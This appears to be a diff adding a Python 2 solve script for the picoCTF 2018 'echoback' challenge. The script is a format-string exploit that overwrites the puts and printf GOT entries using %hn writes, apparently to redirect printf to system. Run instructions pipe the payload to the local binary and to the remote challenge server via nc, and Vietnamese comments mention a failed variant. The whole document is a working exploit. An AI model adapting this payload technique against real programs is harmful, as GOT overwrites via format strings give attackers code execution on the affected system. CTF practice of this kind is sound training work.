@@ -1,0 +1,29 @@
+-----Instruction-----
+    (python solve; cat) | ./echoback (filename: solve)
+    (python solve; cat) | nc 2018shell.picoctf.com 22462
+    
+-----CODE-----
+PUTS = struct.pack("I", 0x804a01c)
+PUTS2 = struct.pack("I", 0x804a01c + 2)
+#LOOP = 0x080485e7
+
+PRINTF = struct.pack("I", 0x804a010)
+PRINTF2 = struct.pack("I", 0x804a010 + 2)
+#SYSTEM = 0xf7e00b30
+#SYSTEM2 = 0x8048460
+
+payload = ''
+#cach lam theo SYSTEM thi khong duoc, co le la do goi system()
+#payload += PUTS2 + PRINTF + PUTS + PRINTF2 + "%2036x" + "%7$hn" + "%812x" + "%8$hn" + "%31415x" + "%9$hn" + "%29177x" + "%10$hn"
+
+#cach lam theo SYSTEM2
+payload += PRINTF2 + PUTS2 + PRINTF + PUTS
+payload += "%2036x" + "%7$hn"
+payload += "%8$hn"
+payload += "%31836x" + "%9$hn"
+payload += "%391x" + "%10$hn"
+
+
+print payload
+
+              
